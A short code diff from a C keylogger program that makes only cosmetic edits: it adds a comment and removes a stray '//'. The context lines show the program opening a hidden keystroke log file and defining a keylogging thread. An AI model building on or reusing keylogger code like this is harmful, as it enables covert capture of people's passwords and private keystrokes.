@@ -57,6 +57,7 @@ int main(int argc, char **argv)
     /*Retrieve Keyboard file descriptor*/
     struct Config config = retrive_keyboard_file();
     
+    /*Open log file*/
     FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
     if (keylog_log == NULL)
     {
@@ -245,7 +246,7 @@ struct Config retrive_keyboard_file()
     return config;
 
 }
-//
+
 void* start_keylogging(void *args)
 {
     typedef struct input_event input_event;
